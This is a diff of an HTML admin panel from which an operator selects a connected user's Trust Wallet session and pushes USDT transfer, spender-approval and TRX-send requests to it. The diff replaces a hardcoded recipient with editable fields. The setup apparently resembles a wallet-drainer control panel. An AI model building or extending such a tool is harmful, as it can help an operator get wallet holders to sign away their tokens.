@@ -3,28 +3,24 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Admin — USDT Transfer</title>
+    <title>Admin - TRON Requests</title>
     <link rel="stylesheet" href="/admin/admin.css" />
   </head>
   <body>
     <main class="wrap">
-
-      <!-- Header -->
       <header class="card header-card">
         <div class="brand">
           <span class="brand-dot"></span>
-          <h1>USDT Admin Panel</h1>
+          <h1>TRON Admin Panel</h1>
         </div>
-        <p>Desktop-only. All transactions require the user to approve in Trust Wallet.</p>
+        <p>Desktop-only. Users review each request on the dApp screen and approve it in Trust Wallet.</p>
       </header>
 
-      <!-- Mobile block -->
       <section class="card warn-card" id="mobileBlock" hidden>
-        <h2>⛔ Desktop Only</h2>
+        <h2>Desktop Only</h2>
         <p>This admin panel is only accessible from a desktop or laptop browser.</p>
       </section>
 
-      <!-- Connection -->
       <section class="card">
         <h2>Connection</h2>
         <div class="grid2">
@@ -39,12 +35,11 @@
         </div>
         <div class="row">
           <button id="connectBtn" type="button">Connect</button>
-          <button id="refreshBtn" type="button" class="secondary">↻ Refresh</button>
+          <button id="refreshBtn" type="button" class="secondary">Refresh</button>
         </div>
         <p id="status" class="status-text">Not connected</p>
       </section>
 
-      <!-- Connected wallets -->
       <section class="card">
         <h2>Connected Wallets</h2>
         <div class="tableWrap">
@@ -62,39 +57,37 @@
         </div>
       </section>
 
-      <!-- Send Request -->
       <section class="card">
         <h2>Send Transaction Request</h2>
         <p class="card-desc">
-          Select a wallet session, choose the transaction type, enter the amount, then send.
-          The user will see an approval popup in their browser.
+          Select a wallet session, choose the transaction type, enter the values, then send.
+          The connected client builds the transaction and Trust Wallet asks the user to sign it.
         </p>
 
         <form id="requestForm">
-
           <div class="grid2" style="margin-bottom: 12px;">
             <label>
               Target Wallet
-              <select id="walletSelect"><option value="">— Select wallet —</option></select>
+              <select id="walletSelect"><option value="">- Select wallet -</option></select>
             </label>
             <label>
               Transaction Type
               <select id="requestType">
-                <option value="trc20_transfer">🔄 Send USDT (Transfer)</option>
-                <option value="trc20_approve">✅ Approve Spender</option>
+                <option value="trc20_transfer">Send USDT (Transfer)</option>
+                <option value="trc20_approve">Approve Spender</option>
+                <option value="send_trx">Send TRX</option>
               </select>
             </label>
           </div>
 
-          <!-- Transfer fields -->
           <div id="transferFields">
+            <label style="margin-bottom: 12px; display: block;">
+              Recipient Address
+              <input id="recipientAddress" placeholder="T... (recipient wallet address)" />
+            </label>
             <div class="info-row">
               <span class="info-key">Token</span>
               <span class="info-val">USDT (TRC-20)</span>
-            </div>
-            <div class="info-row">
-              <span class="info-key">Recipient</span>
-              <span class="info-val mono">TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV</span>
             </div>
             <div class="info-row">
               <span class="info-key">Network</span>
@@ -102,7 +95,6 @@
             </div>
           </div>
 
-          <!-- Approve fields -->
           <div id="approveFields" hidden>
             <label style="margin-bottom: 12px; display: block;">
               Spender Address
@@ -118,9 +110,24 @@
             </div>
           </div>
 
+          <div id="trxFields" hidden>
+            <label style="margin-bottom: 12px; display: block;">
+              Recipient Address
+              <input id="trxRecipientAddress" placeholder="T... (recipient wallet address)" />
+            </label>
+            <div class="info-row">
+              <span class="info-key">Asset</span>
+              <span class="info-val">TRX</span>
+            </div>
+            <div class="info-row">
+              <span class="info-key">Network</span>
+              <span class="info-val">TRON Mainnet</span>
+            </div>
+          </div>
+
           <div class="grid2" style="margin-top: 14px;">
             <label>
-              Amount (USDT)
+              Amount
               <input id="amountValue" type="number" min="0.000001" step="any" placeholder="e.g. 500" />
             </label>
             <label>
@@ -129,7 +136,6 @@
             </label>
           </div>
 
-          <!-- Hidden fixed fields -->
           <input type="hidden" id="tokenAddress" value="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" />
           <input type="hidden" id="decimalsValue" value="6" />
 
@@ -137,7 +143,6 @@
         </form>
       </section>
 
-      <!-- Request log -->
       <section class="card">
         <h2>Request Log</h2>
         <div class="tableWrap">
@@ -146,7 +151,7 @@
               <tr>
                 <th>Created</th>
                 <th>Type</th>
-                <th>Amount (USDT)</th>
+                <th>Amount</th>
                 <th>Wallet</th>
                 <th>Status</th>
                 <th>TxID</th>
@@ -158,12 +163,10 @@
         </div>
       </section>
 
-      <!-- Events -->
       <section class="card">
         <h2>Event Log</h2>
         <pre id="eventsBox">No events yet.</pre>
       </section>
-
     </main>
 
     <script src="/admin/admin.js"></script>
